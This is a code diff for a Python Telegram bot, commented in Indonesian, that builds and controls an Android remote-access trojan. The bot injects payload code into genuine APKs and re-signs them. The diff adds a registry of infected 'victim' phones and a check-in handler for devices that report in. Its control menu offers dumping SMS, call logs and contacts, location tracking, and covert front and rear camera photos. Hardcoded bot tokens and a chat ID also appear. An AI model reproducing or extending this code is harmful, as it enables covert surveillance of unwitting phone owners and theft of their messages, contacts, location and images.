@@ -6,14 +6,14 @@ import uuid
 import zipfile
 import xml.etree.ElementTree as ET
 import urllib.request
+import json
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# ── KONFIGURASI BARU ──
+# ── KONFIGURASI ──
 TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo" 
 PAYLOAD_BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"
-# ⚠️ GANTI PAKE USERNAME BOT PAYLOAD BARU KAMU (tanpa @)
-PAYLOAD_BOT_USERNAME = "IsiUsernameBotPayloadBaruKamu" 
+PAYLOAD_BOT_USERNAME = "Hasil_rat_bot" # GANTI INI
 
 ALLOWED_CHAT_ID = "8598136412" 
 
@@ -22,6 +22,7 @@ KEYSTORE_PATH = f"{WORK_DIR}/app_debug.keystore"
 KEYSTORE_PASS = "123456"
 KEY_ALIAS = "debugkey"
 PAYLOAD_SMALI_DIR = f"{WORK_DIR}/payload_smali/com/system/update"
+DEVICES_FILE = f"{WORK_DIR}/devices.json"
 
 os.makedirs(WORK_DIR, exist_ok=True)
 logging.disable(logging.CRITICAL)
@@ -29,6 +30,19 @@ user_states = {}
 
 def is_authorized(update: Update):
     return str(update.effective_chat.id) == ALLOWED_CHAT_ID
+
+def load_devices():
+    if not os.path.exists(DEVICES_FILE):
+        return []
+    try:
+        with open(DEVICES_FILE, "r") as f:
+            return json.load(f)
+    except:
+        return []
+
+def save_devices(devices):
+    with open(DEVICES_FILE, "w") as f:
+        json.dump(devices, f)
 
 def ensure_keystore():
     if not os.path.exists(KEYSTORE_PATH):
@@ -118,7 +132,7 @@ def inject_permission_popup(apk_out_dir):
     if injected:
         with open(smali_path, "w", encoding="utf-8") as f: f.writelines(lines)
         return "✅ Pop-up & StartService disuntikkan."
-    else: return "⚠️ Gagal nyuntik onCreate (Format Smali beda)."
+    else: return "⚠️ Gagal nyuntik onCreate."
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_authorized(update): return
@@ -138,15 +152,25 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if query.data == "menu_build":
         user_states[chat_id] = "waiting_apk"
         await query.edit_message_text("📦 **Build APK Baru**\n\nSilakan kirim file `.apk` asli.", parse_mode='Markdown')
+        
     elif query.data == "menu_device":
-        keyboard = [[InlineKeyboardButton("📱 HP Korban 1", callback_data="device_1")],[InlineKeyboardButton("⬅️ Kembali", callback_data="back_start")]]
-        await query.edit_message_text("📱 **List Device Ter-Sadap**\n\nPilih device:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+        devices = load_devices()
+        if not devices:
+            await query.edit_message_text("📱 **List Device Ter-Sadap**\n\nBelum ada device yang masuk.\n*(Install APK-nya di HP target, buka aplikasinya, dan pastikan internetnya nyala).*", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="back_start")]]), parse_mode='Markdown')
+        else:
+            keyboard = []
+            # Tampilin max 5 device
+            for idx, dev in enumerate(devices[:5]):
+                keyboard.append([InlineKeyboardButton(f"📱 {dev}", callback_data=f"device_{idx}")])
+            keyboard.append([InlineKeyboardButton("⬅️ Kembali", callback_data="back_start")])
+            await query.edit_message_text(f"📱 **List Device Ter-Sadap ({len(devices)} HP)**\n\nPilih device:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+
     elif query.data == "menu_backup":
         await query.edit_message_text("⏳ Sedang membackup...")
         zip_path = f"{WORK_DIR}/backup_r4t.zip"
         try:
             with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                for file in ["builder_bot.py", "app_debug.keystore", "devices.db"]:
+                for file in ["builder_bot.py", "app_debug.keystore", "devices.json"]:
                     if os.path.exists(f"{WORK_DIR}/{file}"): zipf.write(f"{WORK_DIR}/{file}", file)
                 if os.path.exists(f"{WORK_DIR}/payload_smali"):
                     for root, dirs, files in os.walk(f"{WORK_DIR}/payload_smali"):
@@ -156,9 +180,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.message.reply_text("✅ **Backup Berhasil!**")
             await start(update, context)
         except Exception as e: await query.message.reply_text(f"❌ Gagal Backup: {e}"); await start(update, context)
-    elif query.data == "back_start": await start(update, context)
-    
-    elif query.data == "device_1":
+        
+    elif query.data == "back_start": 
+        await start(update, context)
+        
+    elif query.data.startswith("device_"):
         keyboard = [[InlineKeyboardButton("📂 Cek File", callback_data="cmd_cek_file"), InlineKeyboardButton("📩 Dump SMS", callback_data="cmd_dump_sms")],[InlineKeyboardButton("📞 Dump Telpon", callback_data="cmd_dump_telpon"), InlineKeyboardButton("👥 Dump Kontak", callback_data="cmd_dump_kontak")],[InlineKeyboardButton("📍 Lokasi", callback_data="cmd_lacak"), InlineKeyboardButton("📸 Foto Depan", callback_data="cmd_foto_depan")],[InlineKeyboardButton("📷 Foto Belakang", callback_data="cmd_foto_belakang")],[InlineKeyboardButton("⬅️ Kembali", callback_data="menu_device")]]
         await query.edit_message_text("🎮 **Menu Kontrol**\nPilih aksi:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
@@ -171,10 +197,24 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"⚠️ **JANGAN KETIK DI CHAT INI!**\n\n"
             f"Silakan klik tombol di bawah untuk buka **Bot Payload**, lalu **COPY & KIRIM** teks ini di sana:\n\n"
             f"`{perintah}`\n\n"
-            f"*(Pastikan nggak ada typo, huruf kecil semua).*",
+            f"*(Pastikan nggak ada typo).*",
             reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode='Markdown'
         )
+
+# Handler buat nangkep pesan /checkin dari APK korban
+async def handle_checkin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update): return
+    
+    text = update.message.text
+    if text.startswith("/checkin "):
+        device_info = text.replace("/checkin ", "").strip()
+        devices = load_devices()
+        
+        if device_info not in devices:
+            devices.append(device_info)
+            save_devices(devices)
+            await update.message.reply_text(f"✅ Device Baru Terhubung: {device_info}\nTotal: {len(devices)} HP.")
 
 async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str, file_name: str):
     chat_id = str(update.effective_chat.id)
@@ -232,6 +272,7 @@ def main():
     app = ApplicationBuilder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^/checkin '), handle_checkin))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     print("🤖 Bot Builder & Controller nyala...")
     app.run_polling()
